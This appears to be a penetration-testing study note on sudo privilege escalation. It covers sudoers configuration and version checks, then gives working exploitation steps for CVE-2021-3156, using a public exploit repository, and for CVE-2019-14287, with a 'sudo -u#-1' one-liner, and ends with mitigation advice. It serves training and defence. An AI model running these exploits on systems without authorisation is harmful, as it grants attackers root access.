### **Overview**

- _sudo_ allows users to run commands with the privileges of another user (typically root).
- Configuration is managed in **/etc/sudoers**.
- Syntax for command restriction:
```bash
cry0l1t3 ALL=(ALL) /usr/bin/id
```

---

### **Check Sudoers Entries**
```bash
sudo cat /etc/sudoers | grep -v "#" | sed -r '/^\s*$/d'
```

---

### **Sudo Version Check**
```bash
sudo -V | head -n1
# Sudo version 1.8.31
```

---

### **Vulnerability: CVE-2021-3156 (Heap Buffer Overflow)**

- Affects:
    
    - Sudo versions 1.8.31 (Ubuntu 20.04)
    - 1.8.27 (Debian 10)
    - 1.9.2 (Fedora 33)

- Exploitation steps:
```bash
git clone https://github.com/blasty/CVE-2021-3156.git
cd CVE-2021-3156
make
./sudo-hax-me-a-sandwich
```

+ Run exploit for specific OS version:
```bash
./sudo-hax-me-a-sandwich 1
```

---

### **Vulnerability: CVE-2019-14287 (Sudo Policy Bypass)**

- Affects: All sudo versions < **1.8.28**
- Prerequisite: User allowed to run a command as _any_ user:
```bash
cry0l1t3 ALL=(ALL) /usr/bin/id
```

- Exploit with UID -1 (interpreted as UID 0):
```bash
sudo -u#-1 id
# uid=0(root)
```

---

### **Mitigation**

- Upgrade sudo to latest version.
- Audit `/etc/sudoers` entries to avoid overly broad user permissions.
- Avoid allowing sudo access to commands with wildcard user IDs.
